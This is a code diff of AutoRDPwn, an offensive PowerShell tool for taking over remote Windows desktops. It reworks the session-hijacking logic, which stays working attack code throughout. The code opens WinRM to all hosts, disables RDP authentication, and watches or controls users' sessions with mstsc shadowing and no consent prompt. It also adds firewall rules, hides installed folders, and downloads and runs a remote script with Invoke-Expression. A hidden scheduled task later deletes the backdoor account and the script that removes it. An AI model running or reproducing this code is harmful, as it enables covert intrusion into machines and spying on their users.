@@ -411,8 +411,8 @@ function Remove-Exclusions {
         'X' { continue }
         default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','3','4','5','6','7','X')
 
-   if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force
-   cmdkey /generic:$domain/$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null } ; $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
+   if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force }
+   $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
    Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
    if(!$user) { $RDP = New-PSSession -Computer $computer } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) 
    $RDP = New-PSSession -Computer $computer -credential $credential } ; $session = get-pssession ; if ($session){
@@ -467,12 +467,9 @@ function Remove-Exclusions {
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
         Write-Host ; Write-Host "$using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session }
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine() ; if(!$nogui){
-	
-        if($hash) { if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f }}}
-        elseif($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1')
+	if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1')
 	if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
-        if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
+	if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
 
         else { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$vncserver){ invoke-command -session $RDP[0] -scriptblock {
@@ -481,12 +478,10 @@ function Remove-Exclusions {
         netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
         netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
         attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; sleep -milliseconds 7500 ; rm .\Setup.msi 2>&1> $null }}
-        $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId } ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; Write-Host ; Write-Host "$txt35" ; sleep -milliseconds 2500 ; if(!$nogui){
 
-        if($hash) { if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /f }}}
-        elseif($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1')
-	if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
+        $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId } ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; Write-Host ; Write-Host "$txt35" ; sleep -milliseconds 2500 ; if(!$nogui){
+        if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1')
+        if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
         if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
         if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}
 
@@ -495,7 +490,7 @@ if ($nogui){ Write-Host $txt66 -ForegroundColor Green ; Write-Host ; Write-Host 
 if ($createuser -like '-createuser') { $hash ="true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
 else { Write-Host $txt38 -ForegroundColor Red ; sleep -milliseconds 4000 }
 
-if ($hash){ cmdkey /del $domain/$computer 2>&1> $null ; invoke-command -session $RDP[0] -scriptblock {
+if ($hash){ invoke-command -session $RDP[0] -scriptblock {
 $script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
 echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
 $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
